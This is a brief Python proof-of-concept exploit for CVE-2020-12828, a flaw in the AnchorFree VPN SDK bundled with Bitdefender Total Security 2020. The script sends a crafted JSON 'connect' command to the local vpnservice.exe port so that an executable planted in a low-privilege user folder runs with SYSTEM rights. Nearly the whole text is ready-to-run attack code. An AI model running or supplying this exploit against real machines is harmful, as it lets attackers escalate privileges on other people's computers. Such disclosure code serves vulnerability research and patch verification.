# Thu Jan 2020 
# Basic PoC for ZombieVPN (CVE-2020-12828): anchorFree VPN SDK SYSTEM level code execution  
# Tested on Bitdefender total security 2020 (1.2.13.81)
# Tested on Windows 7/10 x64 x86 

# me [at] 0xsha.io


import socket
import base64
import json


HOST = '127.0.0.1'    
PORT = 52217 # vpnservice.exe port (remotely guessable)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((HOST, PORT))


#  this will run openvpn.exe (your payload) with SYSTEM account

payload = r'''{"command" : "connect", 
            "vpnExecutablePath" : "C:\Users\LowPriv", 
            "protocol" : "udp",
            "ip" : "1.2.3.4", 
            "port" : "", 
            "authFilename" : "c21f7755f3b1f134148ab607dbbcea17.txt", 
            "enableLog" : false}'''.encode(encoding='utf-8')



print ('CVE-2020-12828 - Anchorfree SYSTEM level code execution')
print ('By 0xSha')
print ('Exploiting ...')

s.sendall(payload)
#print(base64.b64decode(payload))
data = s.recv(1024)
s.close()
if 'isSuccess' in repr(data):
                print ("Your payload executed as SYSTEM !")
else:
                print (":( Nope ")
